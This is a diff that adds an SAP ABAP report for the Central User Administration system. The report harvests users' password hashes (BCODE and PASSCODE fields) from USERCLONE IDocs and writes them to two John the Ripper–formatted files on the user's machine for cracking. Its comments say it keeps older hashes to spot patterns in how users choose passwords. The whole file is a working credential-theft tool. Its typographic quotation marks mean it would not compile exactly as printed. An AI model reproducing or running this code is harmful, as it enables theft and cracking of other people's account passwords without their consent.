@@ -1,0 +1,232 @@
+## This is an SAP ABAP report to be run in the CUA system:
+
+REPORT  z_idoc.  “Can be optimized, but you get the point…
+
+TYPES: BEGIN OF t_bcode,
+  bname TYPE usr02-bname,
+  bcode TYPE char16,
+  datum TYPE edi_ccrdat,
+  zeit TYPE edi_ccrtim,
+  END OF t_bcode,
+  BEGIN OF t_gcode,
+  bname TYPE usr02-bname,
+  passcode TYPE char40,
+  datum TYPE edi_ccrdat,
+  zeit TYPE edi_ccrtim,
+  END OF t_gcode.
+
+DATA: gt_docs TYPE TABLE OF edidc,
+      ls_docs LIKE LINE OF gt_docs,
+      gt_details TYPE TABLE OF edidd,
+      ls_details LIKE LINE OF gt_details,
+      gv_name TYPE usr02-bname,
+      gv_bcode TYPE usr02-bcode,
+      gt_bcode TYPE char16,
+      gt_passcode TYPE char40,
+      gv_passcode TYPE usr02-passcode,
+      gt_jtr_b TYPE TABLE OF text255,
+      ls_jtr_b LIKE LINE OF gt_jtr_b,
+      gt_jtr_g TYPE TABLE OF text255,
+      ls_jtr_g LIKE LINE OF gt_jtr_g,
+      int TYPE i,
+      gtab_bcode TYPE STANDARD TABLE OF t_bcode INITIAL SIZE 0,
+      ls_bcode LIKE LINE OF gtab_bcode,
+      gtab_gcode TYPE STANDARD TABLE OF t_gcode INITIAL SIZE 0,
+      ls_gcode LIKE LINE OF gtab_gcode.
+
+*select on EDIDC –> MESTYP ‘USERCLONE’. Don’t only use most recent IDOC for a user, but all entries for a user to see if there are patterns in users choosing new passwords
+
+* for example just raising numbers at the end of a password
+
+SELECT * FROM edidc INTO ls_docs WHERE mestyp = ‘USERCLONE’.
+  APPEND ls_docs TO gt_docs.
+ENDSELECT.
+
+* Read details of Idocs
+
+LOOP AT gt_docs INTO ls_docs.
+  REFRESH: gt_details.
+
+  CALL FUNCTION ‘IDOC_READ_COMPLETELY’
+    EXPORTING
+      document_number = ls_docs-docnum
+    TABLES
+      int_edidd       = gt_details.
+      
+  LOOP AT gt_details INTO ls_details.
+    IF ls_details-segnam = ‘E1BPBNAME’.
+      CLEAR gv_name.
+      gv_name = ls_details-sdata+0(12).
+    ENDIF.
+    IF ls_details-segnam = ‘E1BPMETHOD’.
+      IF ls_details-sdata NE ‘CLONE’.
+        EXIT.
+      ENDIF.
+    ENDIF.
+    
+    IF ls_details-segnam = ‘E1BPLOGOND’.
+
+      IF ls_details-sdata+53(16) NE ‘0000000000000000’.
+
+        CLEAR: gv_bcode, gt_bcode, gv_passcode.
+
+        gv_bcode = ls_details-sdata+53(16).
+        gt_bcode = gv_bcode.
+        gv_passcode = ls_details-sdata+70(40).
+        gt_passcode = gv_passcode.
+        ls_bcode-bname = gv_name.
+        ls_bcode-bcode = gt_bcode.
+        ls_bcode-datum = ls_docs-credat.
+        ls_bcode-zeit = ls_docs-cretim.
+
+        APPEND ls_bcode TO gtab_bcode.
+
+        ls_gcode-bname = gv_name.
+        ls_gcode-passcode = gt_passcode.
+        ls_gcode-datum = ls_docs-credat.
+        ls_gcode-zeit = ls_docs-cretim.
+
+        APPEND ls_gcode TO gtab_gcode.
+
+      ENDIF.
+    ENDIF.
+  ENDLOOP.
+ENDLOOP.
+
+SORT gtab_bcode BY bname datum DESCENDING.
+SORT gtab_gcode BY bname datum DESCENDING.
+
+*Output a JTR file for all unique users with most recent hash and pad spaces to make file JTR ready
+*TODO: Make a new file with the old password hashes as they need to be unique
+
+LOOP AT gtab_bcode INTO ls_bcode.
+
+  ON CHANGE OF ls_bcode-bname.
+    CLEAR int.
+    int = STRLEN( ls_bcode-bname ).
+    CASE int.
+
+*       Fill username up to 40 characters with spaces for BCODE’.
+
+      WHEN 1.  CONCATENATE ls_bcode-bname ‘:’ ls_bcode-bname ‘                                       $’ ls_bcode-bcode INTO ls_jtr_b.
+      WHEN 2.  CONCATENATE ls_bcode-bname ‘:’ ls_bcode-bname ‘                                      $’ ls_bcode-bcode INTO ls_jtr_b.
+      WHEN 3.  CONCATENATE ls_bcode-bname ‘:’ ls_bcode-bname ‘                                     $’ ls_bcode-bcode INTO ls_jtr_b.
+      WHEN 4.  CONCATENATE ls_bcode-bname ‘:’ ls_bcode-bname ‘                                    $’ ls_bcode-bcode INTO ls_jtr_b.
+      WHEN 5.  CONCATENATE ls_bcode-bname ‘:’ ls_bcode-bname ‘                                   $’ ls_bcode-bcode INTO ls_jtr_b.
+      WHEN 6.  CONCATENATE ls_bcode-bname ‘:’ ls_bcode-bname ‘                                  $’ ls_bcode-bcode INTO ls_jtr_b.
+      WHEN 7.  CONCATENATE ls_bcode-bname ‘:’ ls_bcode-bname ‘                                 $’ ls_bcode-bcode INTO ls_jtr_b.
+      WHEN 8.  CONCATENATE ls_bcode-bname ‘:’ ls_bcode-bname ‘                                $’ ls_bcode-bcode INTO ls_jtr_b.
+      WHEN 9.  CONCATENATE ls_bcode-bname ‘:’ ls_bcode-bname ‘                               $’ ls_bcode-bcode INTO ls_jtr_b.
+      WHEN 10. CONCATENATE ls_bcode-bname ‘:’ ls_bcode-bname ‘                              $’ ls_bcode-bcode INTO ls_jtr_b.
+      WHEN 11. CONCATENATE ls_bcode-bname ‘:’ ls_bcode-bname ‘                             $’ ls_bcode-bcode INTO ls_jtr_b.
+      WHEN 12. CONCATENATE ls_bcode-bname ‘:’ ls_bcode-bname ‘                            $’ ls_bcode-bcode INTO ls_jtr_b.
+
+    ENDCASE.
+
+    APPEND ls_jtr_b TO gt_jtr_b.
+
+  ENDON.
+
+ENDLOOP.
+
+LOOP AT gtab_gcode INTO ls_gcode.
+
+  ON CHANGE OF ls_gcode-bname.
+
+    CLEAR int.
+
+    int = STRLEN( ls_gcode-bname ).
+
+    CASE int.
+
+*       Fill username up to 40 characters with spaces for PASSCODE’.
+
+      WHEN 1.  CONCATENATE ls_gcode-bname ‘:’ ls_gcode-bname ‘                                       $’ ls_gcode-passcode INTO ls_jtr_g.
+      WHEN 2.  CONCATENATE ls_gcode-bname ‘:’ ls_gcode-bname ‘                                      $’ ls_gcode-passcode INTO ls_jtr_g.
+      WHEN 3.  CONCATENATE ls_gcode-bname ‘:’ ls_gcode-bname ‘                                     $’ ls_gcode-passcode INTO ls_jtr_g.
+      WHEN 4.  CONCATENATE ls_gcode-bname ‘:’ ls_gcode-bname ‘                                    $’ ls_gcode-passcode INTO ls_jtr_g.
+      WHEN 5.  CONCATENATE ls_gcode-bname ‘:’ ls_gcode-bname ‘                                   $’ ls_gcode-passcode INTO ls_jtr_g.
+      WHEN 6.  CONCATENATE ls_gcode-bname ‘:’ ls_gcode-bname ‘                                  $’ ls_gcode-passcode INTO ls_jtr_g.
+      WHEN 7.  CONCATENATE ls_gcode-bname ‘:’ ls_gcode-bname ‘                                 $’ ls_gcode-passcode INTO ls_jtr_g.
+      WHEN 8.  CONCATENATE ls_gcode-bname ‘:’ ls_gcode-bname ‘                                $’ ls_gcode-passcode INTO ls_jtr_g.
+      WHEN 9.  CONCATENATE ls_gcode-bname ‘:’ ls_gcode-bname ‘                               $’ ls_gcode-passcode INTO ls_jtr_g.
+      WHEN 10. CONCATENATE ls_gcode-bname ‘:’ ls_gcode-bname ‘                              $’ ls_gcode-passcode INTO ls_jtr_g.
+      WHEN 11. CONCATENATE ls_gcode-bname ‘:’ ls_gcode-bname ‘                             $’ ls_gcode-passcode INTO ls_jtr_g.
+      WHEN 12. CONCATENATE ls_gcode-bname ‘:’ ls_gcode-bname ‘                            $’ ls_gcode-passcode INTO ls_jtr_g.
+
+    ENDCASE.
+
+    APPEND ls_jtr_g TO gt_jtr_g.
+
+  ENDON.
+
+ENDLOOP.
+
+DATA: ld_filename TYPE string,
+      ld_path TYPE string,
+      ld_fullpath TYPE string,
+      ld_result TYPE i.
+
+* Display save dialog window for BCODES
+
+CALL METHOD cl_gui_frontend_services=>file_save_dialog
+  EXPORTING
+    window_title      = ‘SAVE JTR BCODE HASHES ‘
+    default_extension = ‘TXT’
+    default_file_name = ‘JTR_BCODE_HASHES’
+    initial_directory = ‘c:\temp\’
+  CHANGING
+    filename          = ld_filename
+    path              = ld_path
+    fullpath          = ld_fullpath
+    user_action       = ld_result.
+
+* Check user did not cancel request
+
+CHECK ld_result EQ ‘0’.
+
+CALL FUNCTION ‘GUI_DOWNLOAD’
+  EXPORTING
+    filename         = ld_fullpath
+  TABLES
+    data_tab         = gt_jtr_b
+  EXCEPTIONS
+    file_open_error  = 1
+    file_write_error = 2
+    OTHERS           = 3.
+
+* Display save dialog window for PASSCODES
+
+CALL METHOD cl_gui_frontend_services=>file_save_dialog
+  EXPORTING
+    window_title      = ‘SAVE JTR PASSCODE HASHES ‘
+    default_extension = ‘TXT’
+    default_file_name = ‘JTR_GCODE_HASHES’
+    initial_directory = ‘c:\temp\’
+  CHANGING
+    filename          = ld_filename
+    path              = ld_path
+    fullpath          = ld_fullpath
+    user_action       = ld_result.
+
+* Check user did not cancel request
+
+CHECK ld_result EQ ‘0’.
+
+CALL FUNCTION ‘GUI_DOWNLOAD’
+  EXPORTING
+    filename         = ld_fullpath
+  TABLES
+    data_tab         = gt_jtr_g
+  EXCEPTIONS
+    file_open_error  = 1
+    file_write_error = 2
+    OTHERS           = 3.
+
+MESSAGE s208(00) WITH ‘Files downloaded to frontend’.
+
+DATA: lv_lines TYPE i.
+
+DESCRIBE TABLE gt_jtr_b LINES lv_lines.
+
+WRITE: lv_lines, ‘hashes written to two files.’.
